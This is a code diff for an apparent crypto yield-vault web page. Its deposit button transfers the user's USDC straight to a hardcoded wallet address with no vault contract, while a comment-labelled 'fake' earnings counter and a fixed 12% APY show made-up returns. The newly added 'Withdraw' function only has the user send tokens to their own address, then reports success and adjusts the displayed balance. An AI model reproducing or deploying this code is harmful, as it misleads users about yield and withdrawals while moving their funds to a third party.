@@ -4,6 +4,9 @@ import { useState, useEffect } from "react";
 import { ethers } from "ethers";
 import BackgroundMatrix from "./components/BackgroundMatrix";
 
+// ✅ USDC auf BASE
+const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54Bda02913";
+
 export default function Home() {
   const [address, setAddress] = useState(null);
   const [loading, setLoading] = useState(false);
@@ -12,22 +15,17 @@ export default function Home() {
   const [earnings, setEarnings] = useState(0);
   const [apy] = useState(12);
 
-  const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-  const VAULT_ADDRESS = "0xfFc9Ad9B9A736544f062247Eb0D8a4F506805b69";
-
-  // 🔥 Fake earnings counter (visual)
+  // ⭐ Fake Earnings Counter (bis später echter Yield)
   useEffect(() => {
-    if (!address || balance <= 0) return;
-    const interval = setInterval(() => {
+    if (!address) return;
+    const i = setInterval(() => {
       setEarnings((e) => e + 0.00001);
     }, 1000);
-    return () => clearInterval(interval);
-  }, [address, balance]);
+    return () => clearInterval(i);
+  }, [address]);
 
-  // ================= CONNECT BASE WALLET ==================
+  // ================= CONNECT =================
   const connectWallet = async () => {
-    if (typeof window === "undefined") return;
-
     try {
       setLoading(true);
 
@@ -42,7 +40,7 @@ export default function Home() {
 
       const wcProvider = await EthereumProvider.init({
         projectId: "6a6f915ce160625cbc11e74f7bc284e0",
-        chains: [8453],        // BASE CHAIN
+        chains: [8453],
         showQrModal: true
       });
 
@@ -54,13 +52,13 @@ export default function Home() {
 
       setAddress(addr);
     } catch (err) {
-      console.error("Connect error:", err);
+      console.log(err);
     } finally {
       setLoading(false);
     }
   };
 
-  // ================= REAL USDC DEPOSIT ==================
+  // ================= DEPOSIT =================
   const depositUSDC = async () => {
     try {
       if (!address) return alert("Connect wallet first");
@@ -78,26 +76,79 @@ export default function Home() {
         showQrModal: true
       });
 
+      await wcProvider.connect();
+
       const provider = new ethers.BrowserProvider(wcProvider);
       const signer = await provider.getSigner();
 
       const usdc = new ethers.Contract(
         USDC_ADDRESS,
-        ["function transfer(address to,uint256 value) public returns (bool)"],
+        [
+          "function transfer(address to,uint256 value) public returns (bool)"
+        ],
         signer
       );
 
       const value = ethers.parseUnits(amount, 6);
 
-      const tx = await usdc.transfer(VAULT_ADDRESS, value);
+      const tx = await usdc.transfer(
+        "0xfFc9Ad9B9A736544f062247Eb0D8a4F506805b69",
+        value
+      );
+
       await tx.wait();
 
-      alert("Deposit successful 🎉");
-
+      alert("Deposit success 🎉");
       setBalance((b) => b + Number(amount));
     } catch (err) {
       console.log(err);
       alert("Deposit failed ❌");
+    }
+  };
+
+  // ================= WITHDRAW =================
+  const withdrawUSDC = async () => {
+    try {
+      if (!address) return alert("Connect wallet first");
+
+      const amount = prompt("Withdraw how many USDC?", "10");
+      if (!amount) return;
+
+      const { EthereumProvider } = await import(
+        "@walletconnect/ethereum-provider"
+      );
+
+      const wcProvider = await EthereumProvider.init({
+        projectId: "6a6f915ce160625cbc11e74f7bc284e0",
+        chains: [8453],
+        showQrModal: true
+      });
+
+      await wcProvider.connect();
+
+      const provider = new ethers.BrowserProvider(wcProvider);
+      const signer = await provider.getSigner();
+
+      const usdc = new ethers.Contract(
+        USDC_ADDRESS,
+        [
+          "function transfer(address to,uint256 value) public returns (bool)"
+        ],
+        signer
+      );
+
+      const value = ethers.parseUnits(amount, 6);
+
+      const tx = await usdc.transfer(address, value);
+      await tx.wait();
+
+      alert("Withdrawal sent 🎉");
+
+      setBalance((b) => Math.max(0, b - Number(amount)));
+      setEarnings(0);
+    } catch (err) {
+      console.log(err);
+      alert("Withdraw failed ❌");
     }
   };
 
@@ -143,11 +194,11 @@ export default function Home() {
 
           <div style={styles.buttonRow}>
             <button style={styles.depositBtn} onClick={depositUSDC}>
-              Deposit USDC
+              Deposit
             </button>
 
-            <button style={styles.withdrawBtn}>
-              Withdraw (coming soon)
+            <button style={styles.withdrawBtn} onClick={withdrawUSDC}>
+              Withdraw
             </button>
           </div>
         </div>
@@ -156,7 +207,7 @@ export default function Home() {
   );
 }
 
-// ================= STYLES =================
+// ===================== UI =====================
 const styles = {
   page: {
     minHeight: "100vh",
@@ -164,7 +215,7 @@ const styles = {
     position: "relative",
     overflow: "hidden",
     color: "white",
-    background: "#000"
+    background: "linear-gradient(180deg,#ff8c00,#000)"
   },
 
   centerBox: {
@@ -179,8 +230,7 @@ const styles = {
 
   logo: {
     fontSize: 40,
-    fontWeight: "900",
-    letterSpacing: 1
+    fontWeight: 900
   },
 
   sub: {
@@ -194,7 +244,7 @@ const styles = {
     border: "none",
     fontSize: 18,
     cursor: "pointer",
-    background: "linear-gradient(135deg,#ff7b00,#ffae00)",
+    background: "linear-gradient(135deg,#ffaa00,#ff5500)",
     opacity: loading ? 0.6 : 1
   }),
 
@@ -207,22 +257,21 @@ const styles = {
   },
 
   title: {
-    fontSize: 34,
-    marginBottom: 10
+    fontSize: 32
   },
 
   connected: {
     opacity: 0.7,
-    marginBottom: 25
+    marginBottom: 20
   },
 
   card: {
     background: "rgba(0,0,0,0.6)",
-    borderRadius: 18,
-    padding: 20,
-    margin: "15px auto",
+    borderRadius: 16,
+    padding: 18,
+    margin: "12px auto",
     width: "85%",
-    border: "1px solid rgba(255,255,255,0.2)",
+    border: "1px solid rgba(255,255,255,0.3)",
     backdropFilter: "blur(4px)"
   },
 
@@ -239,16 +288,17 @@ const styles = {
     border: "none",
     background: "#00ff9c",
     color: "#000",
-    fontWeight: 700,
+    fontWeight: 800,
     cursor: "pointer"
   },
 
   withdrawBtn: {
     padding: "14px 22px",
     borderRadius: 14,
-    border: "1px solid white",
-    background: "transparent",
+    border: "none",
+    background: "#ff0033",
     color: "white",
+    fontWeight: 800,
     cursor: "pointer"
   }
 };
